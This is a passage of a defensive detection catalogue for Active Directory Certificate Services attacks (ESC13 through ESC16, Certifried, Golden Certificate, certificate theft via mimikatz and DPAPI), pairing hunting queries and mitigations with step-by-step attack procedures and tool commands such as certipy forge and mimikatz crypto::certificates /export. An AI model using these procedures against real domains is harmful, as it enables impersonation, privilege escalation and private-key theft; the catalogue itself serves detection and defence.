and correlate reads of the sensitive registry key HKLM\\SOFTWARE\\Yubico\\YubiHSM PIN/auth key (reg query; Sysmon EID1/12/13 for the reg process/keys). It is malicious if PIN read leads to CA private-key signing via yubihsm-connector, Golden Certificate forgery through Certipy forge/ForgeCert, then 4768 auth with an abnormally long-lived / out-of-revocation-chain cert from the same principal. It is benign when a CA/HSM admin performs maintenance, key rotation, or backup from a PAW under an approved procedure and the registry read is diagnostic with no forged signing.","hunt":[{"plat":"Sentinel","t":"Interactive/RDP logon to the CA server (4624 type 2/10). Non-ops account interactive logon to CA = black / known CA admin maintenance = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624\n| where LogonType in (2, 10)\n| where Computer has \"CA\"  // confirm CA hostnames\n| where AccountType == \"User\"\n| summarize count() by Computer, TargetUserName, LogonType, IpAddress\n| where count_ > 0"},{"plat":"MDE","t":"Interactive/RemoteInteractive logon to CA host (endpoint view). Unexpected interactive session enabling HSM PIN abuse = black / steady automation = white","q":"DeviceLogonEvents\n| where Timestamp > ago(1d)\n| where LogonType in (\"Interactive\",\"RemoteInteractive\")\n| where DeviceName has \"CA\"  // confirm CA host\n| project Timestamp, DeviceName, AccountName, LogonType, RemoteIP, IsLocalAdmin\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Interactive/RDP logon (type 2/10) to a CA host from rare user/IP = bad / steady admin = benign","q":"event_simpleName=UserLogon (LogonType=2 OR LogonType=10) ComputerName=\"*CA*\"\n| stats count dc(RemoteAddressIP4) as srcIPs by ComputerName, UserName, LogonType, RemoteAddressIP4\n| sort - count"}]},{"name":"ESC13 - Issuance Policy OID Linked to AD Group (OID Group Link)","aka":"msDS-OIDToGroupLink abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a certificate template's issuance policy OID is linked to an AD group via msDS-OIDToGroupLink, authenticating with a certificate issued from that template grants membership in the linked group, effectively escalating into a privileged group.","how":"Prereq: an Issuance Policy OID is linked to a privileged group (e.g. a high-privilege group) and the template carrying that OID has low-privilege Enroll rights. Use certipy find to identify ESC13, enroll in the template, then certipy auth with the obtained certificate; the linked group SID is placed in the Kerberos token, escalating privileges.","tools":"Certipy (find/req/auth), PowerView(msDS-OIDToGroupLink列挙)","detect":"Audit msDS-OIDToGroupLink settings on OID container objects (msPKI-Enterprise-Oid). Correlate template issuance (4887) with subsequent logons carrying privileged-group membership.","events":"4887, 4768, 4769, 5136","mitigate":"Inventory group links via msDS-OIDToGroupLink and remove OID links to privileged groups. Where a link is required, tighten Enroll rights on the target template and require manager approval.","triage":"On the DC, check 5136 for add/modify of msDS-OIDToGroupLink on msPKI-Enterprise-Oid objects; then on the issuing CA correlate 4887 for the template carrying that Issuance Policy OID (Requester, serial), followed by 4768 (PKINIT with Certificate Information) for the same account within minutes. It is malicious if a low-priv Enroll principal enrolls and then logs on (4624 LogonType3 + 4672) with rights matching the linked privileged group SID. It leans benign if the OID-group link is pre-approved with no change-5136, a legitimate PKI admin set it from a PAW, and enrollment is an expected in-hours service-account/renewal.","hunt":[{"plat":"Sentinel","t":"Setting msDS-OIDToGroupLink on the OID container (5136). OID linked to a privileged group = black / no such change = white","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID == 5136\n| where Properties has \"msDS-OIDToGroupLink\" or ObjectName has \"msPKI-Enterprise-Oid\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc\n// linking issuance-policy OID to an AD group is extremely rare -> ESC13"},{"plat":"Sentinel","t":"OID-linked template issuance (4887) correlated with subsequent privileged logon. Issue→immediate priv use = black / issuance without priv use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4887\n| project TimeGenerated, Computer, Requester=SubjectUserName, ObjectName\n| join kind=inner (\n    SecurityEvent\n    | where TimeGenerated > ago(1d)\n    | where EventID == 4672\n    | project TimeGenerated, Priv=SubjectUserName, PrivilegeList\n) on $left.Requester == $right.Priv\n| where TimeGenerated1 between (TimeGenerated .. (TimeGenerated + 1h))"}],"huntcs":[{"plat":"Event Search","t":"certipy enumerating/enrolling an OID-group-linked template = bad / normal template = benign","q":"event_simpleName=ProcessRollup2 CommandLine=\"*certipy*\" (CommandLine=\"*OIDToGroupLink*\" OR CommandLine=\"*issuance*\" OR CommandLine=\"*-template*\") (CommandLine=\"*req*\" OR CommandLine=\"*find*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"OIDToGroupLink set + resulting privileged-group logon is DC-side; defer to IdP","q":"// Falcon Identity Protection detection: certificate issuance policy OID linked to a privileged AD group (msDS-OIDToGroupLink) granting effective group membership at logon (5136/4768/4769)"}]},{"name":"ESC14 - Weak Explicit Certificate Mapping (altSecurityIdentities)","aka":"explicit certificate mapping abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1098","cve":"","sev":"High","summary":"With write access to a target account's altSecurityIdentities attribute, an attacker can explicitly map an attacker-controlled certificate to the account and impersonate it. Weak mapping formats (issuer name, UPN, etc.) allow impersonation even with a third-party certificate.","how":"Prereq: Write on the victim account's altSecurityIdentities. Add the Issuer+Subject or a weak identifier of a certificate you issue/hold to the target's altSecurityIdentities, then authenticate as the target via PKINIT/Schannel with that certificate. Even with strong mappings (X509IssuerSerialNumber, etc.), write access lets you bind any attacker certificate.","tools":"Certipy, PowerView Set-ADObject(altSecurityIdentities), Rubeus","detect":"Monitor altSecurityIdentities changes (5136) as a high-signal event. Especially detect explicit mapping additions to admin and service accounts.","events":"5136, 4768, 4769, 4624","mitigate":"Strictly restrict write access to altSecurityIdentities and forbid weak mapping formats (issuer-only, UPN, etc.), allowing only strong mappings (SKI/Issuer+Serial+SubjectKeyId). Set audit alerts on attribute changes.","triage":"On the DC, treat 5136 modifications of altSecurityIdentities as high signal — especially explicit maps added to administrator/service accounts/DC$ — and identify the writing principal (SubjectUserName). It is malicious if the mapped account then shows 4768 (PKINIT) -> 4624 LogonType3 from a foreign host using an attacker certificate. It leans benign if an IDM/certificate-lifecycle product (smart-card issuance, Entra sync) or HR pipeline legitimately updates the mapping under an approved service account writing a strong X509IssuerSerialNumber map per runbook.","hunt":[{"plat":"Sentinel","t":"Change to altSecurityIdentities attribute (5136). Explicit mapping added to admin/service account = black / no change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"altSecurityIdentities\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, TargetObject=ObjectName, OperationType, Properties\n| sort by TimeGenerated desc\n// mapping onto privileged/service accounts = high signal ESC14"},{"plat":"MDI","t":"altSecurityIdentities modification seen at directory layer (MDI). Attribute change targeting privileged account = black / routine update = white","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType has \"altSecurityIdentities\"  // confirm ActionType in your tenant\n| project Timestamp, ActionType, Actor=AccountUpn, TargetAccountUpn, TargetAccountDisplayName, DeviceName, IPAddress\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"PowerShell/DS adding altSecurityIdentities explicit mapping to a privileged account = bad","q":"event_simpleName=ProcessRollup2 (FileName=powershell.exe OR FileName=pwsh.exe OR FileName=certipy.exe) CommandLine=\"*altSecurityIdentities*\"\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"The altSecurityIdentities attribute write (5136) is DC-side; defer to IdP as high signal","q":"// Falcon Identity Protection detection: altSecurityIdentities added/modified on admin or service accounts (weak explicit certificate mapping — 5136)"}]},{"name":"ESC15 - EKUwu (Application Policies in V1 Templates)","aka":"EKUwu","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"CVE-2024-49019","sev":"Critical","summary":"In schema version 1 (V1) templates, the CSR's Application Policies extension can inject arbitrary EKUs (Client Authentication, etc.) or enrollment agent rights, allowing forgery of authentication certificates from Enrollee-supplies-subject V1 templates (e.g. WebServer).","how":"Prereq: Enroll rights on a V1 template (schemaVersion=1, e.g. WebServer). Inject an Application Policies extension into the CSR with certipy req -template WebServer -application-policies '1.3.6.1.5.5.7.3.2' (Client Auth) or '...20.2.1' (Enrollment Agent) to obtain a SAN-impersonation certificate or an Enrollment Agent certificate, used for authentication or proxy enrollment.","tools":"Certipy (req -application-policies), 手製CSR(openssl)","detect":"Detect issuance (4887) from V1 templates producing certificates whose Application Policies/EKU differ from the template's intended EKU. A Client Auth certificate coming from a server template like WebServer is anomalous.","events":"4886, 4887, 4768","mitigate":"Apply the CVE-2024-49019 patch (Nov 2024). Retire V1 templates and migrate to V2+, and remove Enroll rights on Enrollee-supplies-subject V1 templates. Verify the post-patch CA configuration disables Application Policies injection.","triage":"On the CA, pull 4886/4887 for issuance from schemaVersion=1 (V1) templates such as WebServer and compare the issued cert's EKU/Application Policies against the template's intended pKIExtendedKeyUsage (e.g. Client Auth 1.3.6.1.5.5.7.3.2 or Enrollment Agent 1.3.6.1.4.1.311.20.2.1 appearing on a server template). It is malicious if a CSR injected Application Policies and is immediately followed by SAN impersonation/agent enrollment then 4768 (PKINIT). It is benign when a real web server obtains only Server Auth EKU from WebServer with no injected Application Policies and the requester is a known web/LB host.","hunt":[{"plat":"Sentinel","t":"Server V1 template issuance (4886/4887) carrying Client Auth / injected Application Policies. Client-Auth EKU on WebServer = black / server-only EKU = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where Properties has \"Application Policies\" or Properties has \"Client Authentication\"\n| where Properties has_any (\"WebServer\",\"Machine\",\"Computer\")\n| project TimeGenerated, Computer, Requester=SubjectUserName, ObjectName, Properties\n| sort by TimeGenerated desc\n// server template emitting a client-auth-capable cert = EKUwu (CVE-2024-49019)"}],"huntcs":[{"plat":"Event Search","t":"certipy req -application-policies (EKUwu) injecting Client Auth into a V1 template = bad","q":"event_simpleName=ProcessRollup2 CommandLine=\"*certipy*req*\" (CommandLine=\"*-application-policies*\" OR CommandLine=\"*1.3.6.1.5.5.7.3.2*\" OR CommandLine=\"*ClientAuthentication*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"}]},{"name":"ESC16 - Security Extension Disabled Globally on CA","aka":"SID security extension disabled CA-wide","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When szOID_NTDS_CA_SECURITY_EXT (SID extension) is disabled CA-wide via the CA's DisableExtensionList, certificates from all templates lack the SID binding, enabling broad ESC9-like UPN-rewrite impersonation.","how":"Prereq: szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) is registered in DisableExtensionList in the CA registry policy and disabled. Rewrite the victim account's UPN to administrator, enroll in any authentication template, revert the UPN, then authenticate as administrator with the SID-extension-less certificate. Broader than ESC9 because it affects the entire CA.","tools":"Certipy (find でESC16検出, account update, req, auth)","detect":"Audit whether the SID security extension OID is present in the CA registry's DisableExtensionList. Monitor authentication with SID-extension-less certificates and UPN rewrites (5136).","events":"5136, 4886, 4887, 4768","mitigate":"Remove szOID_NTDS_CA_SECURITY_EXT from the CA's DisableExtensionList so the SID security extension is issued for all templates. Apply KB5014754 enforcement mode and baseline-monitor the CA registry configuration.","triage":"Audit the CA host registry (Policy\\DisableExtensionList under CertSvc) for szOID_NTDS_CA_SECURITY_EXT 1.3.6.1.4.1.311.25.2 and note when it was added. It is malicious if a DC 5136 shows a victim UPN swapped to administrator and back, plus CA 4886/4887 issuing a cert lacking the SID security extension, followed by 4768 (PKINIT) as administrator on that serial. It is benign when DisableExtensionList is empty, UPN changes trace to legitimate IDM/account merges, and issued certs correctly carry the SID extension.","hunt":[{"plat":"MDE","t":"SID security-extension OID (1.3.6.1.4.1.311.25.2) added to CA DisableExtensionList. Extension disabled CA-wide = black / OID absent = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"CertSvc\\Configuration\"\n| where RegistryValueName == \"DisableExtensionList\"\n| where RegistryValueData has \"1.3.6.1.4.1.311.25.2\"\n| project Timestamp, DeviceName, RegistryKey, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"Under ESC16, UPN rewrite (5136) preparing auth via SID-ext-less cert. Repeated UPN rewrites = black / stable UPN = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"userPrincipalName\"\n| summarize changes=count(), actors=make_set(SubjectUserName) by ObjectName, bin(TimeGenerated, 2h)\n| where changes >= 2"}],"huntcs":[{"plat":"Event Search","t":"SID-extension OID (…311.25.2) added to CA DisableExtensionList = global disable = bad","q":"event_simpleName IN (RegSystemConfigValueUpdate, RegGenericValueUpdate) RegValueName=\"DisableExtensionList\" RegStringValue=\"*1.3.6.1.4.1.311.25.2*\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"},{"plat":"Event Search","t":"certutil -setreg policy\\DisableExtensionList disabling the SID extension CA-wide = bad","q":"event_simpleName=ProcessRollup2 FileName=certutil.exe CommandLine=\"*-setreg*\" CommandLine=\"*DisableExtensionList*\"\n| stats count by ComputerName, UserName, CommandLine, ParentBaseFileName"}]},{"name":"Certifried - Machine Account dNSHostName Spoofing","aka":"Certifried","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1078","cve":"CVE-2022-26923","sev":"Critical","summary":"Using the default Machine template, rewriting a computer account's dNSHostName to an existing DC's FQDN and enrolling causes the CA to resolve the name as the DC and issue a certificate that authenticates as DC$.","how":"Prereq: pre-patch (before May 2022) environment, MachineAccountQuota>0 or control of an existing machine account. Use certipy account create/update to set a new/existing machine's dNSHostName to DC.domain.local (to bypass the SPN uniqueness check, first delete the conflicting SPN on the attacker-controlled machine account; no change to the DC object is needed and is normally out of scope), enroll in the Machine template to obtain a certificate with the DC name, then certipy auth to get a TGT as DC$, leading to DCSync.","tools":"Certipy (account create/update, req, auth), addcomputer.py, Powermad","detect":"Monitor computer-account dNSHostName changes (5136), especially collisions with an existing DC name. Correlate certificate issuance (4887) and PKINIT (4768) under pre-patch behavior that does not validate the SID security extension.","events":"5136, 4741/4742(コンピュータ作成/変更), 4886, 4887, 4768","mitigate":"Apply the CVE-2022-26923 patch (KB5014754) to enforce the SID security extension and strong mapping. Set MachineAccountQuota to 0, restrict modification of dNSHostName/servicePrincipalName, and audit computer-account creation.","triage":"On the DC, extract 5136 changes to computer dNSHostName — especially collisions with an existing DC name — and tie them to preceding 4741/4742 (computer create/modify), the operating account, and MachineAccountQuota consumption. It is malicious if CA 4886/4887 then issues a DC-named cert from the Machine template, followed by 4768 (PKINIT) as DC$ and DCSync-style 4662 (Replicating Directory Changes GUID). It is benign on May-2022+ patched CAs (SID extension enforced) where dNSHostName edits stem from legitimate rename/rejoin (SCCM/OSD) with no DC-name collision.","hunt":[{"plat":"Sentinel","t":"dNSHostName attribute changes (5136); a value colliding with an existing DC FQDN = malicious / normal join-time set = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"dNSHostName\"\n| where OperationType == \"%%14674\" or Properties has \"Value Added\"\n| extend NewDnsName = extract(@\"dNSHostName[^A-Za-z0-9]+([A-Za-z0-9\\.\\-]+)\", 1, Properties)\n| where isnotempty(NewDnsName)\n| project TimeGenerated, Computer, Actor=SubjectUserName, ModifiedObject=ObjectName, NewDnsName\n| summarize count() by Actor, ModifiedObject, NewDnsName, Computer"},{"plat":"MDE","t":"Execution of Certifried tooling (Certipy etc.); machine-account creation chained to enrollment = malicious / admin PKI ops = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"certipy\", \"-dns-tcp\", \"account create\", \"dnshostname\")\n    or (FileName in~ (\"certipy.exe\",\"Certipy.exe\") )\n| where ProcessCommandLine has_any (\"req\", \"auth\", \"account\", \"template\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| summarize Cmds=make_set(ProcessCommandLine, 8), n=count() by DeviceName, AccountName"}],"huntcs":[{"plat":"Event Search","t":"Machine-account create + dNSHostName spoof tooling on the attacker host = black; normal domain-join = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*New-MachineAccount*\" OR CommandLine=\"*Set-MachineAccountAttribute*\" OR CommandLine=\"*Whisker*\" OR CommandLine=\"*certipy*\") CommandLine=\"*dnshostname*\"\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"},{"plat":"Identity Protection","t":"5136 dNSHostName change + PKINIT without SID extension is DC-only — Falcon Identity Protection","q":"// Falcon Identity Protection detection: Certifried / CVE-2022-26923 (machine dNSHostName colliding with a DC, PKINIT with missing SID security extension). No attacker-host endpoint telemetry for 5136/4768 — correlate the Certipy/Whisker process above with this IP alert."}]},{"name":"Golden Certificate (CA Private Key Theft / PERSIST3)","aka":"Golden Certificate, ForgeCert","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1552.004, T1550","cve":"","sev":"Critical","summary":"Steal the CA root private key (+certificate) from the CA server and forge client authentication certificates for any user offline, without limit. Unaffected by CRL/revocation, it is the ultimate ADCS persistence with long-term durability.","how":"Prereq: administrator rights on the CA server. Export the CA private key with certipy ca -backup or via DPAPI/CAPI (mimikatz crypto::certificates /export) (for HSMs, obtain the PIN via ESC12), forge an arbitrary user certificate with ForgeCert/certipy forge -ca-pfx ca.pfx -upn administrator@domain.local, then authenticate with certipy auth. Forgery continues even after DC rebuild as long as the CA key is unchanged.","tools":"Certipy (ca -backup / forge), ForgeCert, mimikatz (crypto::certificates /export, lsadump)","detect":"Monitor private-key export, DPAPI/CAPI access, and interactive logons (4624/4672) on the CA server. The strongest signal is a forged certificate authenticating (4768) with no corresponding record in the CA issuance DB (4887); correlate PKINIT with serials absent from the issuance DB.","events":"4768, 4624, 4672, (CA発行DBとの突合)","mitigate":"Store the CA private key in an HSM as non-exportable. Isolate the CA server in Tier 0 and minimize shell access. Since compromise requires CA key rotation (CA rebuild), design a two-tier PKI. Build detection for authentication with serials absent from the issuance DB.","triage":"On the CA host, check 4624/4672 (interactive/RDP admin logon) and process/EDR telemetry for private-key export via certutil -backupkey, certipy ca -backup, or mimikatz crypto::certificates /export and DPAPI/CAPI access. The strongest tell is 4768 (PKINIT) authentication on a serial absent from the CA issuance DB (certutil -view / 4887): authentication succeeding with no issuance record is malicious. It is benign when the key backup was an approved maintenance/DR action from an admin PAW in hours and all subsequent PKINIT serials exist in the issuance DB.","hunt":[{"plat":"MDE","t":"Access to the CA private-key store or key export on a CA host = malicious / scheduled backup = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has @\"\\Microsoft\\Crypto\\Keys\" or FolderPath has @\"\\Microsoft\\Crypto\\RSA\\MachineKeys\"\n| where InitiatingProcessFileName !in~ (\"certsrv.exe\",\"lsass.exe\",\"svchost.exe\")\n| where InitiatingProcessFileName has_any (\"powershell\",\"certutil\",\"mimikatz\",\"rundll32\",\"cmd\")\n| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName\n| summarize Files=make_set(FileName,10), n=count() by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName"},{"plat":"Sentinel","t":"Spike in PKINIT (4768 with certificate info); serials absent from the CA issuance DB point to forged (Golden) certificates","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\" or Properties has \"Certificate Serial Number\"\n| extend Serial = extract(@\"Certificate Serial Number[^0-9A-Fa-f]+([0-9A-Fa-f]+)\", 1, Properties)\n| project TimeGenerated, Computer, TargetUserName, IpAddress, Serial\n| summarize PkinitCount=count(), Serials=dcount(Serial) by TargetUserName, IpAddress\n| where PkinitCount > 3\n| sort by PkinitCount desc"}],"huntcs":[{"plat":"Event Search","t":"CA private-key export / ForgeCert / mimikatz crypto on the CA host = black; sanctioned CA backup = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*crypto::certificates*\" OR CommandLine=\"*ForgeCert*\" OR (CommandLine=\"*certutil*\" AND (CommandLine=\"*-exportPFX*\" OR CommandLine=\"*exportpfx*\")) OR CommandLine=\"*-p *\" AND CommandLine=\"*My*\")\n| stats count values(CommandLine) as cmd values(UserName) as user by ComputerName, FileName\n| sort - count"},{"plat":"Identity Protection","t":"PKINIT with a serial absent from the CA issuance DB is a DC/CA correlation — Falcon Identity Protection","q":"// Falcon Identity Protection detection: forged-certificate authentication (Golden Certificate). 4768 PKINIT with a cert serial not present in the CA issuance log (no 4887) is not visible to Falcon EDR; alert on the CA-key-theft process above and pivot to IP for the anomalous PKINIT."}]},{"name":"THEFT1 - Certificate Export via CryptoAPI/CNG (Memory)","aka":"Mimikatz crypto::certificates","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1555","cve":"","sev":"High","summary":"On a logged-on host, export user and machine certificates and private keys from the CryptoAPI (CAPI)/CNG key stores via memory (bypassing the non-exportable flag).","how":"Prereq: local administrator/SYSTEM on the target host. Use mimikatz crypto::capi / crypto::cng to patch the key providers and extract even non-exportable private keys, then crypto::certificates /export /systemstore:local_machine to produce a PFX. Use the obtained certificate to impersonate other users/machines.","tools":"mimikatz (crypto::capi, crypto::cng, crypto::certificates /export), SharpDPAPI certificates","detect":"Monitor handle access to LSASS/CNG and patching of CAPI/CNG providers (EDR memory-tampering detection). Detect bulk exports from the certificate store and execution of known attack tools.","events":"4656/4663(証明書ストア/鍵ファイルアクセス), EDRテレメトリ","mitigate":"Make private keys non-exportable and hardware-protected (TPM/smart card). Minimize privileged access and use EDR to detect/block credential dumping and provider tampering. Keep critical certificates short-lived.","triage":"On the target host, use EDR memory telemetry to spot CAPI/CNG provider patching (mimikatz crypto::capi/crypto::cng), handle access to LSASS/CNG keys, and 4656/4663 on certificate store/key files, indicating export of non-exportable keys to PFX. It is malicious when known-tool execution (Sysmon EID1 hash/signature of mimikatz/SharpDPAPI) coincides with bulk store export under SYSTEM/local-admin. It is benign when a legitimate backup agent or cert-management product exports exportable keys per runbook with no evidence of provider tampering.","hunt":[{"plat":"MDE","t":"In-memory certificate export via CryptoAPI/CNG (crypto::certificates, certutil -exportPFX) = malicious / sanctioned PFX backup = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"crypto::certificates\", \"crypto::capi\", \"crypto::cng\", \"-exportPFX\", \"Export-PfxCertificate\", \"exportable\")\n| where not(InitiatingProcessFileName in~ (\"ConfigMgr.exe\",\"MsMpEng.exe\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\n| summarize n=count(), Cmds=make_set(ProcessCommandLine,6) by DeviceName, AccountName, FileName"},{"plat":"MDE","t":"Sensitive API calls / memory tampering against CAPI/CNG providers = certificate-theft tradecraft (malicious)","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"SensitiveApiCall\"\n| where InitiatingProcessFileName has_any (\"powershell\",\"rundll32\",\"mimikatz\") or AdditionalFields has_any (\"ncrypt\",\"bcrypt\",\"CryptExportKey\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields\n| summarize n=count() by DeviceName, InitiatingProcessFileName\n| where n > 1"}],"huntcs":[{"plat":"LogScale","t":"mimikatz crypto::capi|cng|certificates in-memory export = black; normal certmgr use = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/crypto::(capi|cng|certificates)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"THEFT2 - User Certificate Theft via DPAPI","aka":"DPAPI masterkey decryption (user)","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1555.004","cve":"","sev":"High","summary":"Decrypt a user's DPAPI-protected private keys (under %APPDATA%\\Microsoft\\Crypto) and masterkeys to steal the user certificate's private key.","how":"Prereq: target user context or a means to decrypt their DPAPI masterkey (user password/domain backup key). Use SharpDPAPI certificates /pvk or mimikatz dpapi::masterkey then dpapi::capi/cng to decrypt the encrypted keys under %APPDATA%\\Microsoft\\Crypto\\RSA(CNG), reconstruct the PFX, and use it for certificate authentication.","tools":"SharpDPAPI (certificates), mimikatz (dpapi::masterkey, dpapi::cng), Certipy (shadow/DPAPI関連)","detect":"Monitor anomalous access to %APPDATA%\\Microsoft\\Crypto and %APPDATA%\\Microsoft\\Protect (masterkeys). Detect attempts to obtain the domain DPAPI backup key (BackupKey) (4662 on Domain).","events":"4656/4663(Cryptoフォルダ), 4662(BackupKey), EDR","mitigate":"Hardware-protect private keys (TPM/smart card) and avoid plaintext DPAPI storage. Restrict and audit access to the DPAPI domain backup key to Tier 0. Use EDR to detect DPAPI abuse tools.","triage":"On the target host, use 4656/4663 and EDR file telemetry to catch anomalous access to %APPDATA%\\Microsoft\\Crypto\\RSA|Keys and %APPDATA%\\Microsoft\\Protect (master keys), plus Sysmon EID1 execution of SharpDPAPI certificates / mimikatz dpapi::masterkey. Also correlate DC 4662 for attempts to read the domain DPAPI BackupKey (G$BCKUPKEY property GUID); alignment of these in one chain is malicious. It is benign when a user's own session normally touches Crypto/Protect or a legitimate profile-migration/backup product accesses them with no BackupKey read or offensive-tool execution.","hunt":[{"plat":"MDE","t":"Anomalous process access to user DPAPI masterkey/cert folders (%APPDATA%\\Microsoft\\Protect, Crypto) = malicious / owner's own session = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has @\"\\AppData\\Roaming\\Microsoft\\Protect\" or FolderPath has @\"\\AppData\\Roaming\\Microsoft\\Crypto\"\n| where InitiatingProcessFileName has_any (\"powershell\",\"cmd\",\"rundll32\",\"certutil\",\"mimikatz\",\"SharpDPAPI\")\n| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName\n| summarize n=count(), Paths=make_set(FolderPath,8) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName\n| where n > 2"},{"plat":"Sentinel","t":"Directory access (4662) to the domain DPAPI BackupKey object; a non-DA principal = malicious","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"BackupKey\" or ObjectName has \"BCKUPKEY\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, AccessMask, Properties\n| summarize n=count() by Actor, ObjectName, Computer"}],"huntcs":[{"plat":"Event Search","t":"User DPAPI masterkey/cert decryption tooling (dpapi::, SharpDPAPI) = black; app DPAPI use = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*dpapi::masterkey*\" OR CommandLine=\"*dpapi::cred*\" OR CommandLine=\"*SharpDPAPI*\" OR CommandLine=\"*certificates /pvk*\" OR (CommandLine=\"*\\\\Microsoft\\\\Protect*\" AND CommandLine=\"*decrypt*\"))\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"}]},{"name":"THEFT3 - Machine Certificate Theft via DPAPI","aka":"DPAPI masterkey decryption (machine)","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1003.004","cve":"","sev":"High","summary":"Decrypt machine-certificate private keys protected by machine DPAPI (SYSTEM) (under %ALLUSERSPROFILE%\\Microsoft\\Crypto, etc.) to steal the computer account's certificate.","how":"Prereq: SYSTEM/administrator on the target host. Use SharpDPAPI certificates /machine or mimikatz with the machine DPAPI masterkey (LSA secret DPAPI_SYSTEM) to decrypt the machine keys and produce a PFX, used for (certificate-based) computer-account authentication. High-value on a DC.","tools":"SharpDPAPI (certificates /machine), mimikatz (dpapi), Certipy","detect":"Monitor access to machine Crypto folders (%ProgramData%\\Microsoft\\Crypto\\Keys, etc.), LSA secrets access, and certificate export under SYSTEM.","events":"4656/4663, 4672, EDR","mitigate":"TPM-protect machine keys and minimize local administrator rights. Use EDR to detect LSA/DPAPI access. Keep certificates on high-value hosts such as DCs short-lived and strictly managed.","triage":"On the target host (high value if a DC), use 4656/4663 and EDR to check access to machine Crypto folders (e.g. %ProgramData%\\Microsoft\\Crypto\\Keys), LSA secrets (DPAPI_SYSTEM) access, and SYSTEM sessions with 4672, plus Sysmon EID1 execution of SharpDPAPI certificates /machine or mimikatz dpapi. It is malicious if fresh SYSTEM leads to machine DPAPI master-key decryption -> PFX -> machine-account 4768 (PKINIT). It is benign when a legitimate config-management/monitoring agent handles machine certs as SYSTEM by design with no LSA-secrets dump or attack-tool traces.","hunt":[{"plat":"MDE","t":"Access to machine DPAPI key store (%ProgramData%\\Microsoft\\Crypto\\Keys) via tooling = malicious / OS services = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has @\"\\ProgramData\\Microsoft\\Crypto\\Keys\" or FolderPath has @\"\\Microsoft\\Crypto\\RSA\\MachineKeys\"\n| where InitiatingProcessFileName !in~ (\"lsass.exe\",\"services.exe\",\"svchost.exe\",\"certsrv.exe\")\n| where InitiatingProcessFileName has_any (\"powershell\",\"cmd\",\"rundll32\",\"certutil\",\"mimikatz\",\"SharpDPAPI\")\n| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine\n| summarize n=count() by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine\n| where n > 2"}],"huntcs":[{"plat":"Event Search","t":"SYSTEM-level machine masterkey/machinecertificate extraction = black; service key use = white","q":"event_simpleName=ProcessRollup2 IntegrityLevel=\"*System*\" (CommandLine=\"*machinemasterkeys*\" OR CommandLine=\"*machinecertificates*\" OR CommandLine=\"*/machine*\" AND CommandLine=\"*SharpDPAPI*\" OR 